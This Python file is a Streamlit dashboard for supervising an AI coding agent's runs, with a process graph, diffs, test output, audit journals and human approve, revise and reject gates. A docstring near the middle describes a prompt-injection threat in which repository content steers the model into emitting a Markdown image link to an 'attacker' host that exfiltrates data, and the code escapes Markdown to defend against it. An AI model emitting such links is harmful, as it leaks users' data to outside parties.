"""Streamlit dashboard (SPEC Phase 5).

    streamlit run src/dashboard.py

Runs list, process graph drawn from `graph.TRANSITIONS` with the current step highlighted, diff, verification
output, event journal, approval history, approve / revise / reject on the pending gate (plan or write) with
an actor name, cost and timing.
Every refresh sweeps expired approvals first. Data access and the graph are plain functions (tested without
Streamlit); `main()` only lays them out.
"""

import asyncio
import re
from dataclasses import dataclass
from pathlib import Path

import streamlit as st

from src.config import DEFAULT_DB, Settings
from src.llm.client import LLMProviderError
from src.llm.fake import FakeScriptExhaustedError
from src.models.state import (
    TERMINAL_STATUSES,
    AgentProcessState,
    ApprovalDecision,
    ProcessStatus,
    StepMetrics,
)
from src.process.engine import DecisionRefusedError, DecisionRequest
from src.process.graph import TRANSITIONS, Step, Terminal
from src.process.steps import HumanApprovalStep
from src.runtime import open_runner
from src.storage.sqlite_store import EventRecord
from src.tools.git_ops import GitError
from src.tools.sandbox import SandboxUnavailableError

IDLE, VISITED, CURRENT = "#f4f4f5", "#dbeafe", "#fde68a"
SUCCESS, FAILURE = "#bbf7d0", "#fecaca"


@dataclass(frozen=True)
class RunView:
    state: AgentProcessState
    events: list[EventRecord]
    approvals: list[ApprovalDecision]
    metrics: list[StepMetrics]
    cost_usd: float


# --- data (no Streamlit) ---------------------------------------------------------------------------------


async def load_runs(db: Path) -> list[AgentProcessState]:
    async with open_runner(db, drive=False) as runner:
        await runner.sweep_expired()
        return await runner.store.list_runs()


async def load_run(db: Path, run_id: str) -> RunView:
    async with open_runner(db, drive=False) as runner:
        state = await runner.status(run_id)  # sweeps expired approvals first
        store = runner.store
        return RunView(
            state=state,
            events=await store.list_events(run_id),
            approvals=await store.list_approvals(run_id),
            metrics=await store.list_metrics(run_id),
            cost_usd=await store.llm_cost_usd(run_id),
        )


async def submit_decision(
    db: Path, run_id: str, request: DecisionRequest, *, mock: bool, script: Path | None
) -> AgentProcessState:
    async with open_runner(db, drive=True, mock=mock, script=script) as runner:
        return await runner.decide(run_id, request)


GATE_TITLES = {
    "plan": "Plan approval: approve to generate the code",
    "write": "Write approval: approve to write the file, then run the tests",
}


_MARKDOWN_SPECIAL = re.compile(r"([\\`*_{}\[\]()#+\-.!|<>~$])")


def md_escape(text: str) -> str:
    """Neutralise Markdown in untrusted text (LLM output, tool output, prompts, paths).

    Streamlit renders Markdown in markdown/caption/info/error...; an LLM steered by content of the target
    repository could otherwise emit `![](https://attacker/?data=...)` and make the browser fetch it.
    """
    return _MARKDOWN_SPECIAL.sub(r"\\\1", text)


def _quote(text: str) -> str:
    return '"' + text.replace("\\", "\\\\").replace('"', '\\"') + '"'


def build_dot(state: AgentProcessState, visited: set[str]) -> str:
    """Graphviz DOT of the transition table; the run's position is highlighted."""
    terminal = state.status in TERMINAL_STATUSES
    lines = [
        "digraph process {",
        "  rankdir=LR;",
        '  node [shape=box, style="rounded,filled", fontname="Helvetica", fontsize=11];',
        '  edge [fontname="Helvetica", fontsize=9];',
    ]
    for step in Step:
        if not terminal and state.current_step == step.value:
            fill, pen = CURRENT, 2.5
        else:
            fill, pen = (VISITED if step.value in visited else IDLE), 1.0
        lines.append(f"  {_quote(step.value)} [fillcolor={_quote(fill)}, penwidth={pen}];")
    for status in sorted({t.target.status for t in TRANSITIONS if isinstance(t.target, Terminal)}):
        fill = IDLE
        if state.status is status:
            fill = SUCCESS if status is ProcessStatus.COMPLETED else FAILURE
        lines.append(f"  {_quote(status.value)} [fillcolor={_quote(fill)}, shape=oval];")
    for t in TRANSITIONS:
        target = t.target.status.value if isinstance(t.target, Terminal) else t.target.value
        style = ", style=dashed" if t.loop else ""
        lines.append(f"  {_quote(t.source.value)} -> {_quote(target)} [label={_quote(t.label)}{style}];")
    lines.append("}")
    return "\n".join(lines)


def _table(rows: list[dict[str, object]]) -> None:
    st.dataframe(rows, use_container_width=True)  # pyright: ignore[reportUnknownMemberType]  (stub gap)


def _seconds(ms: float) -> str:
    return f"{ms / 1000:.1f} s"


# --- page --------------------------------------------------------------------------------------------------

_DECISION_ERRORS = (
    DecisionRefusedError,
    LLMProviderError,
    SandboxUnavailableError,
    FakeScriptExhaustedError,
    GitError,
    LookupError,
    ValueError,
)


def _sidebar() -> tuple[Path, bool, Path | None]:
    st.sidebar.title("Omar Sy Valide")
    db = Path(st.sidebar.text_input("Database", value=str(DEFAULT_DB), key="db_path"))
    mock = st.sidebar.checkbox("Mock LLM (no network)", key="mock_llm")
    script_text = st.sidebar.text_input("Mock script (JSON)", value="", key="mock_script", disabled=not mock)
    st.sidebar.button("Refresh (also expires overdue approvals)", key="refresh")
    return db, mock, (Path(script_text) if script_text else None)


def _decision_panel(view: RunView, db: Path, mock: bool, script: Path | None) -> None:
    state = view.state
    gate = HumanApprovalStep.gate(state)
    if gate is None:
        return
    st.subheader(GATE_TITLES[gate])
    if state.approval_deadline is not None:
        st.caption(f"Deadline: {state.approval_deadline.isoformat(timespec='seconds')}")
    actor = st.text_input("Your name (stored in the audit log)", key="actor")
    comment = st.text_area("Comment (required for revise)", key="comment")
    approve_col, revise_col, reject_col = st.columns(3)
    clicked = None
    if approve_col.button("Approve", key="approve", type="primary"):
        clicked = "approve"
    if revise_col.button("Revise", key="revise"):
        clicked = "revise"
    if reject_col.button("Reject", key="reject"):
        clicked = "reject"
    if clicked is None:
        return
    try:
        request = DecisionRequest.model_validate(
            {"action": clicked, "actor": actor, "comment": comment or None}
        )
        with st.spinner(f"{clicked}: running the next steps..."):
            new_state = asyncio.run(submit_decision(db, state.run_id, request, mock=mock, script=script))
    except _DECISION_ERRORS as exc:
        st.error(f"{clicked} refused: {md_escape(str(exc))}")
        return
    st.session_state["flash"] = f"{clicked} recorded: run {new_state.run_id} is now {new_state.status.value}"
    st.rerun()


def _run_details(view: RunView, db: Path, mock: bool, script: Path | None) -> None:
    state, settings = view.state, Settings()
    reason = f" ({md_escape(state.terminal_reason)})" if state.terminal_reason else ""
    st.markdown(f"### Run {md_escape(state.run_id)} — **{state.status.value}**{reason}")
    target = f"{state.target_file or '(file not chosen yet)'} in {state.target_repo_path}"
    st.caption(md_escape(f"{target} — {state.user_prompt}"))

    compute = sum(m.compute_ms for m in view.metrics)
    wait = sum(m.wait_ms for m in view.metrics)
    cost_col, compute_col, wait_col, iter_col = st.columns(4)
    cost_col.metric(f"Cost ({settings.usd_to_eur(view.cost_usd):.6f} EUR)", f"${view.cost_usd:.6f}")
    compute_col.metric("Compute time", _seconds(compute))
    wait_col.metric("Human wait", _seconds(wait))
    iter_col.metric("Fix / revision", f"{state.fix_iteration} / {state.revision_iteration}")

    visited = {e.step for e in view.events if e.event_type == "step_completed"}
    st.graphviz_chart(build_dot(state, visited))  # pyright: ignore[reportUnknownMemberType]  (stub gap)

    if state.status is ProcessStatus.AWAITING_APPROVAL:
        _decision_panel(view, db, mock, script)
    if state.compensation is not None:
        c = state.compensation
        st.info(f"Compensation {c.action}: {'done' if c.done else 'NOT done'} — {md_escape(c.detail or '')}")
    if state.error_message:
        st.error(md_escape(state.error_message))

    plan_tab, verify_tab, journal_tab, approvals_tab, metrics_tab = st.tabs(
        ["Plan & diff", "Verification", "Journal", "Approvals", "Metrics"]
    )
    with plan_tab:
        for i, step in enumerate(state.execution_plan or [], 1):
            st.markdown(f"{i}\\. {md_escape(step)}")
        st.code(state.unified_diff or "(no diff yet)", language="diff")
    with verify_tab:
        v = state.verification
        if v is None:
            st.write("Not verified yet.")
        else:
            verdict = {True: "PASSED", False: "FAILED"}
            st.write(f"pytest: {verdict[v.pytest_passed]} — ruff: {verdict[v.linter_passed]}")
            if v.error_summary:
                st.markdown(f"**Summary given to the coder:** {md_escape(v.error_summary)}")
            with st.expander("pytest output"):
                st.code(v.pytest_output or "(empty)")
            with st.expander("ruff output"):
                st.code(v.linter_output or "(empty)")
    with journal_tab:
        _table(
            [
                {
                    "ts": e.ts.isoformat(timespec="seconds"),
                    "step": e.step,
                    "iteration": e.iteration,
                    "event": e.event_type,
                    "payload": str(e.payload) if e.payload else "",
                }
                for e in view.events
            ]
        )
    with approvals_tab:
        if view.approvals:
            _table([a.model_dump(mode="json") for a in view.approvals])
        else:
            st.write("No decision yet.")
    with metrics_tab:
        _table(
            [
                {
                    "step": m.step_name,
                    "iteration": m.iteration,
                    "model": m.model_id or "",
                    "status": m.status,
                    "compute_ms": round(m.compute_ms),
                    "wait_ms": round(m.wait_ms),
                    "tokens_in": m.prompt_tokens,
                    "tokens_out": m.completion_tokens,
                    "cost_usd": m.cost_usd,
                }
                for m in view.metrics
            ]
        )


def main() -> None:
    st.set_page_config(page_title="Omar Sy Valide", layout="wide")
    db, mock, script = _sidebar()
    if flash := st.session_state.pop("flash", None):
        st.success(flash)
    if not db.exists():
        st.info(f"No database at {md_escape(str(db))}. Start a run with `python omar.py` first.")
        return
    runs = asyncio.run(load_runs(db))
    if not runs:
        st.info("No run yet.")
        return
    _table(
        [
            {
                "run": r.run_id,
                "status": r.status.value,
                "reason": r.terminal_reason or "",
                "step": r.current_step,
                "scenario": r.scenario or "",
                "fix": r.fix_iteration,
                "revision": r.revision_iteration,
            }
            for r in runs
        ]
    )
    run_ids = [r.run_id for r in runs]
    selected = st.sidebar.selectbox("Run", run_ids, index=len(run_ids) - 1, key="run_id")
    _run_details(asyncio.run(load_run(db, selected)), db, mock, script)


if __name__ == "__main__":
    main()
